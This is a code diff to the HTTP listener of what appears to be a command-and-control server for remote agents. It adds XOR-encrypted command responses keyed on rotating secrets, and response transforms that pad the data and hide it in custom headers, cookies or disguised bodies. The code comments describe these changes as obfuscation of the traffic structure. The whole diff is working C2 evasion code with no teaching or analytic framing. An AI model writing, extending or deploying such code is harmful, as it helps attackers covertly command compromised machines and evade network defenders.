@@ -4,6 +4,7 @@ package listeners
 import (
 	"c2/internal/common/config"
 	"c2/internal/common/interfaces"
+	"c2/internal/common/transforms"
 	"context"
 	"crypto/hmac"
 	"crypto/rand"
@@ -13,12 +14,14 @@ import (
 	"fmt"
 	"log"
 	"net/http"
+	"strconv"
 	"strings"
 	"time"
 )
 
 // handleGetRequest processes GET requests from agents
-func (m *Manager) handleGetRequest(w http.ResponseWriter, clientID string, cmdBuffer interfaces.CommandBuffer) {
+// responseProfile is optional - if set, applies transforms to response
+func (m *Manager) handleGetRequest(w http.ResponseWriter, clientID string, cmdBuffer interfaces.CommandBuffer, responseProfile *config.ServerResponseProfile) {
 	log.Printf("[GetRequest] Looking up client ID: %q", clientID)
 
 	// Print the current active connections
@@ -186,7 +189,7 @@ func (m *Manager) handleGetRequest(w http.ResponseWriter, clientID string, cmdBu
 
 	// Send XOR encrypted response for all cases
 	if responseToEncrypt != nil {
-		m.sendXOREncryptedResponse(w, responseToEncrypt, clientID, activeConn)
+		m.sendXOREncryptedResponse(w, responseToEncrypt, clientID, activeConn, responseProfile)
 		return
 	}
 
@@ -225,7 +228,7 @@ normalCommand:
 	}
 
 	// Send XOR encrypted response
-	m.sendXOREncryptedResponse(w, responseToEncrypt, clientID, activeConn)
+	m.sendXOREncryptedResponse(w, responseToEncrypt, clientID, activeConn, responseProfile)
 
 	// Rotate secrets
 	h := hmac.New(sha256.New, []byte(activeConn.Secret2))
@@ -244,18 +247,10 @@ normalCommand:
 }
 
 // sendXOREncryptedResponse encrypts and sends the response
-func (m *Manager) sendXOREncryptedResponse(w http.ResponseWriter, response map[string]interface{}, clientID string, conn *ActiveConnection) {
-	// Get init data to derive XOR key
-	initData, err := m.GetInitData(conn.ClientID)
-	if err != nil {
-		// Fallback to unencrypted for backward compatibility
-		w.Header().Set("Content-Type", "application/json")
-		json.NewEncoder(w).Encode(response)
-		return
-	}
-
-	// Derive XOR key - this should match what the payload can derive
-	xorKey := deriveXORKey(clientID, initData.Secret)
+// responseProfile is optional - if set with Data DataBlock, applies transforms to the response
+func (m *Manager) sendXOREncryptedResponse(w http.ResponseWriter, response map[string]interface{}, clientID string, conn *ActiveConnection, responseProfile *config.ServerResponseProfile) {
+	// Derive XOR key using the connection's rotating secret
+	xorKey := deriveXORKey(clientID, conn.Secret1)
 
 	// Marshal the response to JSON
 	jsonData, err := json.Marshal(response)
@@ -268,6 +263,58 @@ func (m *Manager) sendXOREncryptedResponse(w http.ResponseWriter, response map[s
 	// XOR encrypt the entire JSON
 	encryptedData := xorEncryptBytes(jsonData, xorKey)
 
+	// Check if we should apply response transforms
+	if responseProfile != nil && responseProfile.Data != nil && len(responseProfile.Data.Transforms) > 0 {
+		// Apply transforms to the encrypted data
+		xforms := convertConfigTransforms(responseProfile.Data.Transforms)
+		result, err := transforms.Apply(encryptedData, xforms)
+		if err != nil {
+			log.Printf("[GetRequest] Failed to apply response transforms: %v", err)
+			// Fall back to non-transformed response
+		} else {
+			encryptedData = result.Data
+
+			// Add padding length headers if random transforms were used
+			if result.PrependLength > 0 {
+				w.Header().Set("X-Pad-Pre", strconv.Itoa(result.PrependLength))
+			}
+			if result.AppendLength > 0 {
+				w.Header().Set("X-Pad-App", strconv.Itoa(result.AppendLength))
+			}
+
+			// Check output location - if not body, place accordingly
+			locType, name := transforms.ParseOutput(responseProfile.Data.Output)
+			if locType != "body" {
+				// Place transformed data in header/cookie and send empty body
+				switch locType {
+				case "header":
+					w.Header().Set(name, base64.StdEncoding.EncodeToString(encryptedData))
+					w.Header().Set("Content-Type", "application/json")
+					w.Write([]byte("{}"))
+					return
+				case "cookie":
+					http.SetCookie(w, &http.Cookie{
+						Name:  name,
+						Value: base64.StdEncoding.EncodeToString(encryptedData),
+					})
+					w.Header().Set("Content-Type", "application/json")
+					w.Write([]byte("{}"))
+					return
+				}
+			}
+			// For body output with transforms, send transformed data directly
+			// (without JSON wrapping - the transforms ARE the obfuscation)
+			if responseProfile.ContentType != "" {
+				w.Header().Set("Content-Type", responseProfile.ContentType)
+			} else {
+				w.Header().Set("Content-Type", "application/octet-stream")
+			}
+			w.Write(encryptedData)
+			return
+		}
+	}
+
+	// Legacy: No transforms - use JSON wrapping with random keys for obfuscation
 	// Generate random keys to obfuscate the response structure
 	// Use 2-4 character keys that look like generic JSON
 	keys := generateRandomKeys()
@@ -335,7 +382,7 @@ func xorEncryptBytes(data []byte, key []byte) []byte {
 }
 
 // handleGetRequestWithProfile wraps handleGetRequest for profile-bound listeners
-// It applies profile headers before delegating to the original handler
+// It applies profile headers and passes the responseProfile for transform support
 func (m *Manager) handleGetRequestWithProfile(w http.ResponseWriter, clientID string, cmdBuffer interfaces.CommandBuffer, responseProfile *config.ServerResponseProfile) {
 	// Apply profile headers if provided
 	if responseProfile != nil {
@@ -343,6 +390,6 @@ func (m *Manager) handleGetRequestWithProfile(w http.ResponseWriter, clientID st
 			w.Header().Set(header.Name, header.Value)
 		}
 	}
-	// Delegate to original handler - no changes to core logic
-	m.handleGetRequest(w, clientID, cmdBuffer)
+	// Delegate to handler with the response profile for transform support
+	m.handleGetRequest(w, clientID, cmdBuffer, responseProfile)
 }
